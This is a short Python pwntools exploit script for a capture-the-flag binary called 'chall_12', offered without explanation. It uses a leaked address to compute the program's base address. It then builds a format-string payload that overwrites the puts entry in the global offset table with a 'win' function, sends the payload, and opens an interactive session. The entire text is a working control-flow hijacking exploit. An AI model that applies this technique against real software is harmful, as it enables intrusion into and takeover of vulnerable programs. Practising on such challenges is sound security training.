from pwn import *

elf = ELF("./chall_12")
p = process('./chall_12')

p.recvuntil(b':')
leak = p.recv().strip()
intleak = int(leak, 16)

elf.address = intleak - elf.sym['main']
print(f"Base address: {hex(elf.address)}")

puts_got = elf.got['puts']
win_func = elf.sym['win']

print(f"Address of puts@GOT: {hex(puts_got)}")
print(f"Address of win: {hex(win_func)}")

payload = fmtstr_payload(7, {puts_got: win_func}, write_size='byte')

p.sendline(payload)
p.interactive()
